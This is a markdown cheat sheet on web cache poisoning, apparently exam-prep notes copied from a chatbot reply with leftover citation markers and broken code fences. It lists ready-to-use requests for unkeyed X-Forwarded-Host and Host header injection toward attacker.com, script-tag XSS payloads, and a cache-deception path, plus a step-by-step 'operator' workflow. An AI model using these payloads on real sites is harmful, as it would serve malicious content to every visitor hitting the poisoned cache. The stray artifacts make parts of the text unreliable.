
---

``md
> [!ABSTRACT]
> Web Cache Poisoning is a vulnerability where an attacker tricks a caching system (CDN, proxy, browser cache) into storing a **malicious response**, which is then served to other users.  
> 
> It works because caches store responses based on a **cache key** (URL, headers, etc.), but sometimes ignore certain inputs that still affect the response. :contentReference[oaicite:0]{index=0}  
> 
> It happens when:
> - User-controlled input affects the response  
> - That input is **not part of the cache key (unkeyed)**  
> - The response gets cached  
> 
> Impact:
> - Stored XSS (mass exploitation)  
> - Redirect users to attacker-controlled pages  
> - Steal sensitive data  
> 
> 🧠 Think: “You poison one request → everyone gets infected”

---

## 🧠 Web Cache Poisoning – Cheat Sheet

---

### 🎯 1. Basic Detection (Cache Behavior)

> [!CHECK]
> Identify if response is cached  
> Look for cache headers  

```http
GET / HTTP/1.1
````

```http
Cache-Control: no-cache
```

---

### 🧪 2. Identify Cache Key

> [!CHECK]  
> Find which inputs affect cache

```http
GET /?test=1
```

```http
GET /?test=2
```

---

### 🧬 3. Unkeyed Header Injection

> [!SUCCESS]  
> Inject header that affects response but not cache key

```http
X-Forwarded-Host: attacker.com
```

```http
X-Host: attacker.com
```

---

### 🧩 4. Host Header Poisoning

> [!SUCCESS]  
> Manipulate Host header

```http
Host: attacker.com
```

---

### 💥 5. Inject Malicious Payload

> [!SUCCESS]  
> Inject payload into response

```http
X-Forwarded-Host: attacker.com<script>alert(1)</script>
```

---

### ⚙️ 6. Cache Poisoning via Query

> [!ATTENTION]  
> Inject payload in parameters

```http
GET /?q=<script>alert(1)</script>
```

---

### 🧪 7. Cache Key Bypass

> [!ATTENTION]  
> Use parameters ignored by cache

```http
GET /?ignored_param=payload
```

---

### 💣 8. Cache Deception (Store Sensitive Data)

> [!SUCCESS]  
> Trick cache into storing sensitive response

```http
GET /account/profile.css
```

---

### 🧪 9. Vary Header Abuse

> [!ATTENTION]  
> Manipulate headers affecting cache

```http
User-Agent: attacker
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Identify cache:
    

```http
GET / HTTP/1.1
```

2. Check headers:
    

- `Cache-Control`
    
- `X-Cache`
    

3. Inject input:
    

```http
X-Forwarded-Host: attacker.com
```

4. Add payload:
    

```http
<script>alert(1)</script>
```

5. Send request → wait for cache
    
6. Victims receive poisoned response
    

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- CDN-backed apps
    
- Static pages
    
- High-traffic endpoints
    
- API responses with caching
    
- Reverse proxy setups
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
X-Forwarded-Host: attacker.com
Host: attacker.com
GET /?q=<script>alert(1)</script>
GET /?ignored_param=payload
User-Agent: attacker
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Proper cache key configuration
>     
> - Input sanitized
>     
> - No caching enabled
>     

---

> [!ATTENTION]  
> Web Cache Poisoning requires:
> 
> - Cache in place
>     
> - Unkeyed input
>     
> - Controlled response
>     
> 
> No cache → no vulnerability

---

```

---

## 🔥 Key Insight (very important)

- This is a **mass exploitation vulnerability**  
- One successful payload = **affects all users hitting cache**  
- Often chained with:
  - XSS  
  - Open redirect  
  - Host header injection  

---


Just say 🚀
::contentReference[oaicite:1]{index=1}
```